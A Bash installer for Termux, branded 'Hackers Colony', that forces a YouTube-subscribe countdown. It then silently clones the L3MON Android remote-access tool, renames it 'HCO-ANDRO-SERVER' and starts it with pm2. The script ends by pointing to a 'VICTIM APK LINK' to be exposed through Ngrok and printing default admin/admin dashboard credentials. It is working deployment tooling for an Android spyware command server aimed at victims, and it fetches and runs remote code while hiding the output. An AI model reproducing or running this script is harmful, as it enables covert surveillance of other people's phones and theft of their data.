#!/bin/bash

# Professional Clear and Header
clear
echo -e "\e[1;32m"
echo "  _    _  _____  ____              _   _ _____  _____   ____  "
echo " | |  | |/ ____|/ __ \      /\    | \ | |  __ \|  __ \ / __ \ "
echo " | |__| | |    | |  | |    /  \   |  \| | |  | | |__) | |  | |"
echo " |  __  | |    | |  | |   / /\ \  | . \` | |  | |  _  /| |  | |"
echo " | |  | | |____| |__| |  / ____ \ | |\  | |__| | | \ \| |__| |"
echo " |_|  |_|\_____|\____/  /_/    \_\_| \_|_____/|_|  \_\\____/ "
echo -e "\e[0m"
echo -e "\e[1;33m      WELCOME TO HACKERS COLONY - ANDROID SERVER \e[0m"
echo -e "\e[1;36m             Created by: Azhar (HCO Team) \e[0m"
echo -e "\e[1;32m──────────────────────────────────────────────────────────\e[0m"

# Lock System with Countdown
echo -e "\n\e[1;31m  [!] ACCESS DENIED! TOOL IS LOCKED \e[0m"
echo -e "\e[1;37m  To use this tool, you MUST subscribe to our channel.\e[0m"
echo -e "\e[1;37m  Redirecting to YouTube in...\e[0m"

for i in {10..1}
do
    echo -ne "\e[1;32m  >>> $i <<<\r"
    sleep 1
done

# Force Open YouTube
echo -e "\n\e[1;34m  [*] Opening YouTube Channel... Please Subscribe!\e[0m"
termux-open-url https://youtube.com/@hackers_colony_tech
sleep 3

echo -e "\e[1;32m──────────────────────────────────────────────────────────\e[0m"
echo -ne "\e[1;33m  [?] Press ENTER if you have Subscribed and Verified: \e[0m"
read enter

# Professional Installation (Quiet Mode)
echo -e "\n\e[1;34m[*] Building HCO-ANDRO Private Server (Elite Edition)...\e[0m"
apt update && apt upgrade -y > /dev/null 2>&1
pkg install nodejs git python openjdk-17 wget -y > /dev/null 2>&1
npm install pm2 -g > /dev/null 2>&1

# Engine Setup
git clone https://github.com/D3VL/L3MON.git .core > /dev/null 2>&1
mv .core/* . && rm -rf .core
grep -rl "L3MON" . | xargs sed -i 's/L3MON/HCO-ANDRO-SERVER/g' > /dev/null 2>&1

cd server && npm install > /dev/null 2>&1
pm2 start index.js --name "hco-server" > /dev/null 2>&1

# Final Dynamic Result
clear
echo -e "\e[1;32m"
echo "──────────────────────────────────────────────────────────"
echo "         🔥 WELCOME TO HACKERS COLONY SERVER 🔥          "
echo "──────────────────────────────────────────────────────────"
echo -e "\e[0m"
echo -e "\e[1;36m  1. DASHBOARD LINK  : \e[1;37mhttp://localhost:22533\e[0m"
echo -e "\e[1;36m  2. VICTIM APK LINK : \e[1;37m(Use Ngrok to get Public Link)\e[0m"
echo -e "\e[1;32m──────────────────────────────────────────────────────────\e[0m"
echo -e "\e[1;33m  🔑 Login User: admin  |  🔑 Pass: admin\e[0m"
echo -e "\e[1;32m──────────────────────────────────────────────────────────\e[0m"
echo -e "\e[1;34m  📢 Support: https://wa.me/8420611159\e[0m"
